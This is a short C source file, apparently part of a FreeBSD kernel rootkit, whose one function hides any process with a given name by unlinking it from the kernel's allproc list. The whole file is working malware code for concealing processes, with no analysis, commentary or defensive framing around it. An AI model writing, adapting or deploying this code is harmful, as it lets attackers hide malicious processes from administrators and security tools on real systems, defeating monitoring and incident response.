#include "rootkit.h"

int process_hiding(char * p_name) {
	struct proc *p;

	sx_xlock(&allproc_lock);

	/* Iterate through the allproc list. */
	LIST_FOREACH(p, &allproc, p_list) {
		PROC_LOCK(p);

		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}

		/* Do we want to hide this process? */
		if (strncmp(p->p_comm, p_name, MAXCOMLEN) == 0)
			LIST_REMOVE(p, p_list);

		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return 0;
}
